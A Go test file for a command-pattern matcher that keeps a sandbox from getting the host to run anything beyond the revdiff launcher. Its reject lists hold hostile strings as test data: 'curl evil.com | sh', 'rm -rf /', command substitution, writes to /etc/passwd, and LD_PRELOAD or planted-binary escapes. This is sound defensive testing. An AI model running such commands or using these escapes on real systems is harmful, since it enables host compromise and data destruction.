package cmdpattern

import (
	"os"
	"path/filepath"
	"testing"
)

func TestMatchAny(t *testing.T) {
	m := MatchAny()
	if !m(nil) {
		t.Error("MatchAny(nil) should be true")
	}
	if !m([]string{"a", "b"}) {
		t.Error("MatchAny(args) should be true")
	}
}

func TestMatchPrefix(t *testing.T) {
	m := MatchPrefix("--type=overlay")
	if !m([]string{"--type=overlay", "echo", "hi"}) {
		t.Error("expected match for prefix")
	}
	if m([]string{"echo", "hi"}) {
		t.Error("expected no match when prefix absent")
	}
	if m(nil) {
		t.Error("expected no match for empty args with non-empty prefix")
	}
}

func TestMatchShellExec_AcceptsRevdiffViaSh(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExec(inner)

	cases := [][]string{
		{"-c", "revdiff a b"},
		{"-c", "exec revdiff a b"},
		{"-c", "  exec   revdiff --staged"},
	}
	for _, args := range cases {
		t.Run(args[1], func(t *testing.T) {
			if !m(args) {
				t.Errorf("expected match for %q", args)
			}
		})
	}
}

func TestMatchShellExec_RejectsOther(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExec(inner)

	cases := [][]string{
		{"-c", "curl evil.com | sh"},
		{"-c", "echo revdiff"}, // text mentions revdiff but argv[0] is echo
		{"-c", "rm -rf /"},
		{"echo", "revdiff"}, // not -c form
		nil,
	}
	for _, args := range cases {
		t.Run("reject", func(t *testing.T) {
			if m(args) {
				t.Errorf("expected no match for %v", args)
			}
		})
	}
}

// TestMatchShellExec_RejectsShellMetacharacters covers the case where the first
// token legitimately matches the inner program but the rest of the script
// contains shell operators that would execute additional commands. Without
// shellMeta filtering, a MatchAny inner matcher silently accepts these.
func TestMatchShellExec_RejectsShellMetacharacters(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExec(inner)

	bypasses := []string{
		"revdiff && rm -rf /",
		"revdiff; curl evil | sh",
		"revdiff | tee /etc/passwd",
		"revdiff || whoami",
		"revdiff `curl evil`",
		"revdiff $(curl evil)",
		"revdiff > /etc/passwd",
		"revdiff < /etc/shadow",
		"revdiff * ?",
		"revdiff \necho pwned",
		"revdiff \\`echo pwned\\`",
	}
	for _, script := range bypasses {
		t.Run(script, func(t *testing.T) {
			if m([]string{"-c", script}) {
				t.Errorf("bypass: matcher accepted %q", script)
			}
		})
	}
}

// TestMatchShellExecSentinel_AcceptsRevdiffLauncherShape exercises the exact
// form revdiff's kitty launcher produces: single-quoted argv followed by
// "; touch '<sentinel-path>'".
// Each case carries the ResolvedBin the inner pattern would hold in production,
// because argv[0] is matched exactly: an absolute path is accepted only when it
// is the pinned one, and the bare spelling only when nothing is pinned.
func TestMatchShellExecSentinel_AcceptsRevdiffLauncherShape(t *testing.T) {
	cases := []struct{ bin, script string }{
		{"/usr/local/bin/revdiff", `'/usr/local/bin/revdiff' '--output=/tmp/revdiff-output-abc' '--staged'; touch '/tmp/revdiff-done-xyz'`},
		{"", `'revdiff' '--staged'; touch '/tmp/revdiff-done-1'`},
		{"/home/user/.local/bin/revdiff", `'/home/user/.local/bin/revdiff' '--output=/tmp/out' 'HEAD~1'; touch '/home/user/.cache/devsandbox/tmp/revdiff-done-2'`},
	}
	for _, tc := range cases {
		t.Run(tc.script, func(t *testing.T) {
			m := MatchShellExecSentinel(CommandPattern{Program: "revdiff", ResolvedBin: tc.bin, ArgsMatcher: MatchAny()})
			if !m([]string{"-c", tc.script}) {
				t.Errorf("expected accept for %q", tc.script)
			}
		})
	}
}

func TestMatchShellExecSentinel_RejectsAttacks(t *testing.T) {
	// Pinned to the path the cases below use, so each rejection is decided by
	// the script grammar rather than incidentally by the program pin.
	inner := CommandPattern{Program: "revdiff", ResolvedBin: "/bin/revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecSentinel(inner)

	rejects := []string{
		// No sentinel suffix at all.
		`'/bin/revdiff' '--staged'`,
		// Wrong tail program (not touch).
		`'/bin/revdiff'; rm '/etc/passwd'`,
		// Extra command injected before the sentinel.
		`'/bin/revdiff'; curl evil; touch '/tmp/revdiff-done-x'`,
		// Command injection inside a quoted arg via backslash-escape — rejected
		// because backslash is banned inside quotes.
		`'/bin/revdiff\nrm -rf /'; touch '/tmp/revdiff-done-x'`,
		// Unquoted args.
		`revdiff --staged; touch /tmp/revdiff-done-x`,
		// Double quotes (not accepted — wrong quote style).
		`"revdiff" "--staged"; touch "/tmp/revdiff-done-x"`,
		// Sentinel path contains ".."
		`'/bin/revdiff'; touch '/tmp/../etc/passwd'`,
		// Sentinel path has a space.
		`'/bin/revdiff'; touch '/tmp/revdiff done'`,
		// Sentinel path has shell meta.
		`'/bin/revdiff'; touch '/tmp/$(whoami)'`,
		// Two touches — extra shell work.
		`'/bin/revdiff'; touch '/tmp/a'; touch '/tmp/b'`,
		// Pipe in first half.
		`'/bin/revdiff' | 'curl'; touch '/tmp/x'`,
		// Inner program does not match.
		`'/bin/curl' 'evil.com'; touch '/tmp/revdiff-done-x'`,
	}
	for _, script := range rejects {
		t.Run(script, func(t *testing.T) {
			if m([]string{"-c", script}) {
				t.Errorf("expected reject for %q", script)
			}
		})
	}
}

// TestMatchShellExecEnvSentinel_AcceptsEnvWrappedRevdiffLauncherShape exercises
// the revdiff launcher shape introduced in v0.8.0: when EDITOR or VISUAL are
// set on the caller's shell, the launcher prepends `/usr/bin/env KEY=VAL ...`
// so the kitty-spawned overlay inherits the intended editor.
func TestMatchShellExecEnvSentinel_AcceptsEnvWrappedRevdiffLauncherShape(t *testing.T) {
	cases := []struct{ bin, script string }{
		{"/usr/local/bin/revdiff", `'/usr/bin/env' 'EDITOR=nvim' 'VISUAL=nvim' '/usr/local/bin/revdiff' '--output=/tmp/revdiff-output-abc'; touch '/tmp/revdiff-done-xyz'`},
		{"", `'/usr/bin/env' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-1'`},
		// env prefix with no KEY=VAL pairs is still accepted — the revdiff
		// launcher always uses `env` when ENV_PREFIX is non-empty, but a future
		// version could collapse to `env revdiff ...`. Accepting this costs
		// nothing and keeps the matcher robust.
		{"", `'/usr/bin/env' 'revdiff' '--staged'; touch '/tmp/revdiff-done-3'`},
		// Actual launcher output (v0.8.0+): `/usr/bin/env` is left unquoted
		// while every subsequent token is single-quoted. Must match.
		{"/usr/local/bin/revdiff", `/usr/bin/env 'EDITOR=nvim' 'VISUAL=nvim' '/usr/local/bin/revdiff' '--output=/tmp/revdiff-output-abc'; touch '/tmp/revdiff-done-xyz'`},
		{"", `/usr/bin/env 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-4'`},
		{"", `/usr/bin/env 'revdiff' '--staged'; touch '/tmp/revdiff-done-5'`},
	}
	for _, tc := range cases {
		t.Run(tc.script, func(t *testing.T) {
			m := MatchShellExecEnvSentinel(CommandPattern{Program: "revdiff", ResolvedBin: tc.bin, ArgsMatcher: MatchAny()})
			if !m([]string{"-c", tc.script}) {
				t.Errorf("expected accept for %q", tc.script)
			}
		})
	}
}

func TestMatchShellExecEnvSentinel_RejectsAttacks(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner)

	rejects := []string{
		// First token is not env.
		`'/bin/sh' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// env wrapping a non-revdiff program.
		`'/usr/bin/env' 'EDITOR=nvim' '/bin/cat' '/etc/passwd'; touch '/tmp/revdiff-done-x'`,
		// Only env + KEY=VAL, no inner program.
		`'/usr/bin/env' 'EDITOR=nvim'; touch '/tmp/revdiff-done-x'`,
		// Just env with nothing else.
		`'/usr/bin/env'; touch '/tmp/revdiff-done-x'`,
		// Malformed env var name (lowercase).
		`'/usr/bin/env' 'editor=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Malformed env var name (starts with digit).
		`'/usr/bin/env' '1FOO=bar' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Quoted `env` with no path: resolved against PATH, which is exactly
		// what basename matching used to let through.
		`'env' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-2'`,
		// KEY=VAL with shell metacharacter in value (rejected by the
		// parseSingleQuotedArgv byte filter — backslash banned).
		`'/usr/bin/env' 'EDITOR=nvim\nevil' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Missing sentinel tail.
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff' '--staged'`,
		// Extra command appended after sentinel.
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff'; touch '/tmp/a'; curl evil`,
		// Sentinel has ".." segment.
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff'; touch '/tmp/../etc/passwd'`,
		// env prefix followed by a wrapping sh (nested shell).
		`'/usr/bin/env' 'EDITOR=nvim' 'sh' '-c' 'revdiff'; touch '/tmp/revdiff-done-x'`,
		// Unquoted form: only the literal `/usr/bin/env ` prefix is
		// accepted. Bare `env` (PATH-relative) must be rejected so attackers
		// can't shadow `env` via $PATH.
		`env 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Unquoted form: a non-env absolute path must be rejected.
		`/bin/curl 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Unquoted form: /usr/bin/env wrapping a non-revdiff inner program
		// must still be rejected.
		`/usr/bin/env 'EDITOR=nvim' '/bin/cat' '/etc/passwd'; touch '/tmp/revdiff-done-x'`,
		// Unquoted form: symlink-like path ending in /env must be rejected —
		// the prefix check is exact, not basename-matched.
		`/tmp/evil/env 'EDITOR=nvim' 'revdiff'; touch '/tmp/revdiff-done-x'`,
	}
	for _, script := range rejects {
		t.Run(script, func(t *testing.T) {
			if m([]string{"-c", script}) {
				t.Errorf("expected reject for %q", script)
			}
		})
	}
}

// sharedTmpEditor is a path shaped like one inside the host↔sandbox shared temp
// directory — bind-mounted read-write at an identical path on both sides, so a
// binary the sandbox drops there is a binary the host would execute.
const sharedTmpEditor = "/home/u/.cache/devsandbox/tmp/a1b2c3d4e5f6/evil"

// TestMatchShellExecEnvSentinel_RejectsEnvValues covers the mechanism the key
// allowlist alone does not: EDITOR is a variable the launcher exists to
// forward, and revdiff spawns whatever it names. The execution comes from the
// value, so a value the sandbox picked is the defect even when the key is one
// the launcher legitimately emits.
func TestMatchShellExecEnvSentinel_RejectsEnvValues(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner)

	tests := []struct {
		name   string
		assign string
	}{
		{"editor in the shared temp directory", "EDITOR=" + sharedTmpEditor},
		{"visual in the shared temp directory", "VISUAL=" + sharedTmpEditor},
		{"editor as a relative path", "EDITOR=./evil"},
		{"editor as a bare relative path with a separator", "EDITOR=sub/evil"},
		{"editor at an absolute path PATH does not yield", "EDITOR=/opt/planted/nvim"},
		{"editor carrying arguments", "EDITOR=nvim --cmd source /tmp/x"},
		{"editor with a tilde the shell would expand", "EDITOR=~/evil"},
		{"loader variable", "LD_PRELOAD=/tmp/x.so"},
		{"bash startup file", "BASH_ENV=/tmp/x.sh"},
		{"python startup file", "PYTHONSTARTUP=/tmp/x.py"},
		{"perl options", "PERL5OPT=-Mevil"},
		{"path itself", "PATH=/tmp/evil"},
		{"inert flag carrying a path", "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=/tmp/evil"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			script := `/usr/bin/env '` + tt.assign + `' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
			if m([]string{"-c", script}) {
				t.Errorf("expected reject for %q", script)
			}
		})
	}
}

// TestMatchShellExecEnvSentinel_AcceptsHostResolvedEditorPath is the
// counterweight: an absolute EDITOR naming a path the host's own PATH lookup
// yields is the legitimate case and must survive. The host's own setting is
// what makes an editor outside the built-in list acceptable, so it stands in
// for one here - no particular editor is installed on every test machine.
func TestMatchShellExecEnvSentinel_AcceptsHostResolvedEditorPath(t *testing.T) {
	bin, err := ResolveProgram("sh")
	if err != nil {
		t.Skipf("sh not resolvable on this host: %v", err)
	}
	t.Setenv("EDITOR", bin)
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner)

	for _, assign := range []string{
		"EDITOR=" + bin,
		"EDITOR=nvim",
		// Set-but-empty is what the launcher emits when the caller exported
		// the name with no value.
		"EDITOR=",
	} {
		script := `/usr/bin/env '` + assign + `' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
		if !m([]string{"-c", script}) {
			t.Errorf("expected accept for %q", script)
		}
	}
}

// TestMatchShellExecEnvSentinel_RejectsInterpreterEditor covers the gap the
// PATH resolution alone leaves: the host runs `$EDITOR <file>` on a file in the
// project tree, which is bind-mounted read-write, so an interpreter turns that
// file into the program. Resolving the name only decides which host binary
// opens the sandbox's file, not whether it executes it.
func TestMatchShellExecEnvSentinel_RejectsInterpreterEditor(t *testing.T) {
	// A host EDITOR of its own must not widen the check for other names.
	t.Setenv("EDITOR", "nvim")
	t.Setenv("VISUAL", "")
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner)

	for _, value := range []string{"sh", "bash", "python3", "perl", "awk", "node", "env", "xargs"} {
		script := `/usr/bin/env 'EDITOR=` + value + `' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
		if m([]string{"-c", script}) {
			t.Errorf("expected reject for EDITOR=%s", value)
		}
	}
}

// TestMatchShellExecEnvSentinel_RejectsSymlinkedEditorPath pins the swap
// window: resolving the sandbox's own path first accepts a symlink pointed at
// the real editor, and the sandbox repoints it before the host execs. Both
// accepted paths are derived on the host, so a path under a directory the
// sandbox writes through is refused whatever it currently points at.
func TestMatchShellExecEnvSentinel_RejectsSymlinkedEditorPath(t *testing.T) {
	bin, err := ResolveProgram("sh")
	if err != nil {
		t.Skipf("sh not resolvable on this host: %v", err)
	}
	t.Setenv("EDITOR", bin)

	planted := filepath.Join(t.TempDir(), filepath.Base(bin))
	if err := os.Symlink(bin, planted); err != nil {
		t.Fatalf("plant symlink: %v", err)
	}

	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner)
	script := `/usr/bin/env 'EDITOR=` + planted + `' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
	if m([]string{"-c", script}) {
		t.Errorf("accepted a sandbox-writable symlink to the real editor: %s", planted)
	}
}

// TestMatchShellExecEnvSentinel_RejectsPlantedEnvBinary covers the quoted form
// of the env program. The unquoted form was already pinned to an absolute path;
// the quoted one matched on basename, so any path ending in `/env` was accepted
// — including one under a directory the sandbox writes through to the host.
func TestMatchShellExecEnvSentinel_RejectsPlantedEnvBinary(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner)

	for _, prog := range []string{
		"/home/u/.cache/devsandbox/tmp/a1b2c3d4e5f6/env",
		"/tmp/evil/env",
		"env",
		"./env",
	} {
		script := `'` + prog + `' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
		if m([]string{"-c", script}) {
			t.Errorf("expected reject for %q", script)
		}
	}
}

func TestPatternMatchesArgv(t *testing.T) {
	p := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	if !p.MatchesArgv([]string{"revdiff", "a", "b"}) {
		t.Error("expected program-only match")
	}
	if p.MatchesArgv([]string{"/usr/local/bin/revdiff", "a"}) {
		t.Error("a path whose basename matches Program must not match")
	}
	if p.MatchesArgv([]string{"revdiffx", "a"}) {
		t.Error("unrelated program should not match")
	}
	if p.MatchesArgv(nil) {
		t.Error("empty argv should not match")
	}
}

func TestCommandPatternResolvedBinPinsExactPath(t *testing.T) {
	const real = "/usr/local/bin/revdiff"

	p := CommandPattern{Program: "revdiff", ResolvedBin: real, ArgsMatcher: MatchAny()}

	tests := []struct {
		name string
		arg0 string
		want bool
	}{
		{"exact resolved path accepted", real, true},
		{"uncleaned form of the same path accepted", "/usr/local/bin/./revdiff", true},
		{"same basename elsewhere rejected", "/home/zekker/.cache/devsandbox/revdiff-ipc/abc/revdiff", false},
		{"same basename in tmp rejected", "/tmp/revdiff", false},
		{"bare name rejected (host PATH lookup could land anywhere)", "revdiff", false},
		{"different basename at allowed dir rejected", "/usr/local/bin/evil", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := p.MatchesArgv([]string{tt.arg0, "--output=/tmp/o"}); got != tt.want {
				t.Errorf("MatchesArgv(%q) = %v, want %v", tt.arg0, got, tt.want)
			}
		})
	}
}

func TestCommandPatternRejectBeatsEverything(t *testing.T) {
	const ipc = "/home/zekker/.cache/devsandbox/revdiff-ipc/abc"

	// Reject must win even when ResolvedBin names a path inside it, so a
	// misconfigured caller cannot re-open the hole.
	p := CommandPattern{
		Program:     "revdiff",
		ResolvedBin: ipc + "/revdiff",
		Reject:      []string{ipc},
		ArgsMatcher: MatchAny(),
	}
	if p.MatchesArgv([]string{ipc + "/revdiff"}) {
		t.Error("MatchesArgv accepted a program under a rejected prefix, want rejected")
	}
}

func TestCommandPatternRejectPrefixIsSegmentAware(t *testing.T) {
	// ResolvedBin points into the sibling tree, so the only thing separating
	// the accept case from the reject cases is how Reject compares segments.
	p := CommandPattern{
		Program:     "revdiff",
		ResolvedBin: "/a/bc/revdiff",
		Reject:      []string{"/a/b"},
		ArgsMatcher: MatchAny(),
	}

	if p.MatchesArgv([]string{"/a/b/revdiff"}) {
		t.Error("program directly under rejected dir was accepted, want rejected")
	}
	if p.MatchesArgv([]string{"/a/b/nested/revdiff"}) {
		t.Error("program nested under rejected dir was accepted, want rejected")
	}
	// "/a/bc" only shares a string prefix with "/a/b"; it is a different tree.
	if !p.MatchesArgv([]string{"/a/bc/revdiff"}) {
		t.Error("program under sibling dir /a/bc was rejected, want accepted")
	}
}

// TestCommandPatternNoBasenameFallback pins the absence of basename matching.
// It used to be the behavior for any pattern with no ResolvedBin, and it let a
// sandbox satisfy the pattern with its own binary: the shared temp directory
// and the revdiff IPC directory are bind-mounted read-write at an *identical*
// path on host and sandbox, so `<shared tmp>/sh` is a path the sandbox writes
// and the host then executes. argv[0] now has to be a spelling the host itself
// resolves.
func TestCommandPatternNoBasenameFallback(t *testing.T) {
	p := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}

	if !p.MatchesArgv([]string{"revdiff"}) {
		t.Error(`MatchesArgv("revdiff") = false, want true (exact Program match)`)
	}
	for _, arg0 := range []string{
		"/usr/bin/revdiff",
		"/anywhere/at/all/revdiff",
		"/home/u/.cache/devsandbox/tmp/a1b2c3d4e5f6/revdiff",
		"./revdiff",
		"/usr/bin/other",
	} {
		if p.MatchesArgv([]string{arg0}) {
			t.Errorf("MatchesArgv(%q) = true, want false", arg0)
		}
	}
}

// TestCommandPatternShellSpellings covers how the revdiff kitty patterns pin
// the wrapping shell: by spelling, since a shell has no single resolved path
// worth pinning. Only what the host resolves itself is accepted.
func TestCommandPatternShellSpellings(t *testing.T) {
	for _, spelling := range []string{"sh", "/bin/sh"} {
		p := CommandPattern{Program: spelling, ArgsMatcher: MatchAny()}
		if !p.MatchesArgv([]string{spelling, "-c", "true"}) {
			t.Errorf("MatchesArgv(%q) = false, want true", spelling)
		}
		for _, planted := range []string{
			"/home/u/.cache/devsandbox/tmp/a1b2c3d4e5f6/sh",
			"/tmp/evil/sh",
			"./sh",
		} {
			if p.MatchesArgv([]string{planted, "-c", "true"}) {
				t.Errorf("pattern %q accepted sandbox-plantable %q, want rejected", spelling, planted)
			}
		}
	}
}

func TestResolveProgram(t *testing.T) {
	// `go` is on PATH in any environment that can run this test.
	got, err := ResolveProgram("go")
	if err != nil {
		t.Fatalf("ResolveProgram(go) returned error: %v", err)
	}
	if !filepath.IsAbs(got) {
		t.Errorf("ResolveProgram(go) = %q, want an absolute path", got)
	}
	if filepath.Base(got) != "go" {
		t.Errorf("ResolveProgram(go) = %q, want basename %q", got, "go")
	}

	if _, err := ResolveProgram("definitely-not-a-real-binary-xyzzy"); err == nil {
		t.Error("ResolveProgram(nonexistent) returned nil error, want failure so the pattern denies rather than widens")
	}
}
